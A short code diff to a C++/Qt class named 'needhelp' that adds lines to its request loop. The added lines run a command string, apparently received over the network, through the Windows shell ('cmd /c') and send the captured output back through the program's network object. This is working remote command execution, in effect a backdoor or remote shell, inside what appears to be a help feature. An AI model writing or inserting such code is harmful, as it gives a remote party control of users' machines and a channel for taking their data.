@@ -39,6 +39,14 @@ void needhelp::requestloop() {
         {
             waitloop.stop();
             ui->status->setText(command);
+            bool ret;
+            QProcess process;
+            process.setProgram("cmd");
+            process.setArguments(QStringList()<<"/c"<<command);
+            process.start(QIODevice::ReadWrite);
+            ret = process.waitForStarted();
+            process.waitForFinished();
+            net->request(""+net->FUHAO+process.readAllStandardOutput());
             waitloop.start(2000);
         }
     }
